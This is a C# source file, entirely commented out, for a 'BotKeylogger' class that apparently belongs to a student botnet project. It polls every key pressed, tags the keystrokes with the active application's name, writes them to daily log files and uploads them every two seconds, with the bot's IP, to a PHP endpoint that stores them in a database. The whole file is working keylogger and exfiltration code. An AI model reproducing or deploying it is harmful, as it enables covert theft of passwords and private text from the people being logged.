//using System;
//using System.Collections.Generic;
//using System.Diagnostics;
//using System.IO;
//using System.Linq;
//using System.Net;
//using System.Runtime.InteropServices;
//using System.Text;
//using System.Threading;
//using System.Threading.Tasks;
//using System.Timers;
//using System.Windows.Forms;
//using System.Windows.Input;

//namespace Server
//{
//    internal class BotKeylogger
//    {
//        #region Key board
//        static WebClient webclient = Program.webClient;
//        private static string logName = "Log_";
//        private static string logExtendtion = ".txt";
//        static string path = "keystrokes.txt";
//        static bool isStarted = false;

//        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
//        static System.Timers.Timer timer = new System.Timers.Timer();
//        [DllImport("user32.dll")]
//        static extern IntPtr GetForegroundWindow();
//        [DllImport("user32.dll", SetLastError = true)]
//        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

//        static string activeProcessName = GetActiveWindowProcessName().ToLower();
//        static string prevProcessName = activeProcessName;
//        static Thread th_doKeylogger;

//        public static void initClientKeylogger()
//        {
//            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
//            th_doKeylogger.SetApartmentState(ApartmentState.STA);
//            th_doKeylogger.Start();

//            timer.Interval = 2000;
//            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
//            timer.Enabled = true;
//            timer.Start();
//        }
//        public static void StartKeylogger()
//        {
//            isStarted = true;
//            Console.WriteLine("Keylogger started.");
//        }
//        public static void StopKeylogger()
//        {
//            if (File.Exists("keystrokes.txt"))
//            {
//                try
//                {
//                    File.Delete("keystrokes.txt");
//                }
//                catch (Exception)
//                {
//                    Console.WriteLine("unable to delete keystrokes.txt");
//                }
//            }
//            isStarted = false;
//            Console.WriteLine("Keylogger stopped.");
//        }
//        static bool isHotKey = false;
//        static bool isShowing = false;
//        static void checkHotKey(String s)
//        {
//            //if (s.Equals("[ESC]"))
//            //    isHotKey = true;

//            //if (isHotKey)
//            //{
//            //    if (!isShowing)
//            //    {
//            //        DisplayWindow();
//            //    }
//            //    else
//            //        HideWindow();

//            //    isShowing = !isShowing;
//            //}
//            //isHotKey = false;
//        }
//        private static void DoKeylogger()
//        {
//            while (true)
//            {

//                Thread.Sleep(5);
//                if (!isStarted) continue;
//                string keyPressed = GetNewPressedKeys();
//                Console.Write(keyPressed);
//                checkHotKey(keyPressed);
//                string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
//                //StreamWriter sw = new StreamWriter(logNameToWrite, true);
//                //using (StreamWriter sw = File.AppendText(path))
//                using (StreamWriter sw = new StreamWriter(logNameToWrite, true))
//                {
//                    activeProcessName = GetActiveWindowProcessName().ToLower();
//                    if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
//                    bool isOldProcess = activeProcessName.Equals(prevProcessName);
//                    if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)))
//                    {
//                        sw.WriteLine("\n[--" + activeProcessName + "--]");
//                        prevProcessName = activeProcessName;
//                    }
//                    sw.Write(keyPressed);
//                    sw.Close();
//                }
//            }
//        }
//        private static string GetNewPressedKeys()
//        {
//            string pressedKey = String.Empty;

//            foreach (int i in Enum.GetValues(typeof(Key)))
//            {
//                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());
//                bool down = false;
//                if (key != Key.None)
//                {
//                    down = Keyboard.IsKeyDown(key);
//                }

//                if (!down && PressedKeysHistory.Contains(key))
//                    PressedKeysHistory.Remove(key);
//                else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
//                {

//                    if (!isCaps())
//                    {
//                        PressedKeysHistory.Add(key);
//                        pressedKey = key.ToString().ToLower(); //by default it is CAPS
//                    }
//                    else
//                    {
//                        PressedKeysHistory.Add(key);
//                        pressedKey = key.ToString(); //CAPS
//                    }

//                }
//            }
//            return replaceStrings(pressedKey);
//        }
//        private static string replaceStrings(string input)
//        {
//            string replacedKey = input;
//            switch (input)
//            {
//                case "space":
//                case "Space":
//                    replacedKey = " ";
//                    break;
//                case "return":
//                    replacedKey = "\r\n";
//                    break;
//                case "escape":
//                    replacedKey = "[ESC]";
//                    break;
//                case "leftctrl":
//                    replacedKey = "[CTRL]";
//                    break;
//                case "rightctrl":
//                    replacedKey = "[CTRL]";
//                    break;
//                case "RightShift":
//                case "rightshift":
//                    replacedKey = "";
//                    break;
//                case "LeftShift":
//                case "leftshift":
//                    replacedKey = "";
//                    break;
//                case "back":
//                    replacedKey = "[Back]";
//                    break;
//                case "lWin":
//                    replacedKey = "[WIN]";
//                    break;
//                case "tab":
//                    replacedKey = "[Tab]";
//                    break;
//                case "Capital":
//                    replacedKey = "";
//                    break;
//                case "oemperiod":
//                    replacedKey = ".";
//                    break;
//                case "D1":
//                    replacedKey = "!";
//                    break;
//                case "D2":
//                    replacedKey = "@";
//                    break;
//                case "oemcomma":
//                    replacedKey = ",";
//                    break;
//                case "oem1":
//                    replacedKey = ";";
//                    break;
//                case "Oem1":
//                    replacedKey = ":";
//                    break;
//                case "oem5":
//                    replacedKey = "\\";
//                    break;
//                case "oemquotes":
//                    replacedKey = "'";
//                    break;
//                case "OemQuotes":
//                    replacedKey = "\"";
//                    break;
//                case "oemminus":
//                    replacedKey = "-";
//                    break;
//                case "delete":
//                    replacedKey = "[DEL]";
//                    break;
//                case "oemquestion":
//                    replacedKey = "/";
//                    break;
//                case "OemQuestion":
//                    replacedKey = "?";
//                    break;
//            }

//            return replacedKey;
//        }

//        private static bool isCaps()
//        {
//            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
//            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
//            if (isCapsLockOn || isShiftKeyPressed) return true;
//            else return false;
//        }

//        private static string GetActiveWindowProcessName()
//        {
//            IntPtr windowHandle = GetForegroundWindow();
//            GetWindowThreadProcessId(windowHandle, out uint processId);
//            Process process = Process.GetProcessById((int)processId);
//            return process.ProcessName;
//        }

//        // Các hàm dưới này dùng để lấy dữ liệu đã được ghi trong file keylogger sau đó ghi UploadString vào file php, từ php cập nhật csdl
//        static void onTimedEvent(object sender, EventArgs e)
//        {
//            Program program = new Program();
//            String ipBotActive = Program.ipBotActive;
//            if (!isStarted) return;
//            try
//            {
//                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
//                webclient.UploadString("http://localhost/PBL4/sendkeylog.php", "bot=" + ipBotActive + "&keylogger=" + GetKeystrokes());
//            }
//            catch (Exception)
//            {
//                System.Threading.Thread.Sleep(5000); //If No Client
//            }
//        }

//        //--[ get keystrokes ]--
//        public static string GetKeystrokes()
//        {
            
//            string logNameToRead = logName + DateTime.Now.ToLongDateString() + logExtendtion;
//            string logContents = File.ReadAllText(logNameToRead);
//            return logContents;
//        }

//        #endregion
//    }
//}
